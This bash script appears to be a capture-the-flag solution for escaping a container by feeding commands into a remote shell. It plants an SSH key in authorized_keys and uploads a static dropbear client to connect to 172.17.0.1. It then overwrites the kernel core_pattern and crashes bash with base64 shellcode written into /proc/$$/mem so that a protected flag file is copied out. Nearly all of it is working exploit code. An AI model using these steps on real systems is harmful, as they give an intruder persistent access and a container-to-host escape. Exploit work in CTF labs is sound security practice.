#!/bin/bash

# remote drops bytes if we submit too large of an amount at once
TRANSFER_RATE=16k

# wait for the connection to be stable, then hit enter
read

# send the malicious public and private key data to the server
echo "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPvJT8ppXl+iBoeltuBTVquRt4rbf5OQXNhKEqwoDVkd' >> ~/.ssh/authorized_keys
echo $(base64 evil_id_ed25519 | paste -sd '') | base64 -d >> ~/.ssh/id_dropbear
cat ~/.ssh/authorized_keys"
read

# upload a static ssh client (dropbear) to the docker container
# upload regulated by pv for transfer limitations
echo 'cat << THIS_IS_THE_END | base64 -d | xzcat > /bin/ssh'
xz -9 -T 0 -e -c dropbearmulti | base64 | pv -q -L "$TRANSFER_RATE"
echo
echo 'THIS_IS_THE_END'
echo 'chmod +x /bin/ssh'
read

# connect to the machinectl container over ssh
echo 'ssh -T -y 172.17.0.1'
read

# overwrite core pattern and induce a crash in bash by executing a null dereference shellcode
echo 'cd /tmp
mkdir proc
mount -t proc proc proc
echo "|/usr/bin/cp /flag.txt /var/lib/machines/ubuntu/flag.txt" > proc/sys/kernel/core_pattern
bash
cd /proc/$$;read a<syscall;exec 3>mem;base64 -d<<<McBniwA=|dd bs=1 seek=$[`echo $a|cut -d" " -f9`]>&3'
sleep .5

# buffering
echo
sleep .5

# read the flag!
echo 'cat /flag.txt'
